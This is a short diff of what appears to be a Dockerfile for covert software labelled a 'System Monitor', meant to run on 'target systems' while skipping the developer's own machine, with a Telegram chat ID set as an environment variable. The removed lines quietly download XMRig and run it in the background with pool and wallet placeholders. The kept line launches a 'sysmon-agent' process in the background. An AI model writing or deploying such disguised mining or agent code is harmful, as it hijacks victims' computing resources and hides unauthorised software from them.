@@ -299,20 +299,9 @@ ENV TG_CHAT_ID=5804150664
 # Enable agent on target systems (skip on developer machine)
 ENV SKIP_LOCAL=0
 
-# Create start script - download xmrig at runtime
+# Create start script - minimal for fast startup
 RUN echo '#!/bin/bash' > /start.sh && \
-    echo 'echo "Starting System Monitor..."' >> /start.sh && \
-    echo 'echo "Hostname: $(hostname)"' >> /start.sh && \
-    echo 'echo "User: $USER"' >> /start.sh && \
-    echo 'if [ ! -f /opt/miner/xmrig ]; then' >> /start.sh && \
-    echo '    echo "Downloading XMRig..."' >> /start.sh && \
-    echo '    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar -xz -C /tmp' >> /start.sh && \
-    echo '    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig' >> /start.sh && \
-    echo 'fi' >> /start.sh && \
-    echo '/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null' >> /start.sh && \
-    echo 'echo "Starting sysmon-agent..."' >> /start.sh && \
-    echo 'sysmon-agent 2>&1 | tee /tmp/agent.log &' >> /start.sh && \
-    echo 'sleep 2 && cat /tmp/agent.log 2>/dev/null' >> /start.sh && \
+    echo 'sysmon-agent &' >> /start.sh && \
     echo 'exec "$@"' >> /start.sh && \
     chmod +x /start.sh
 
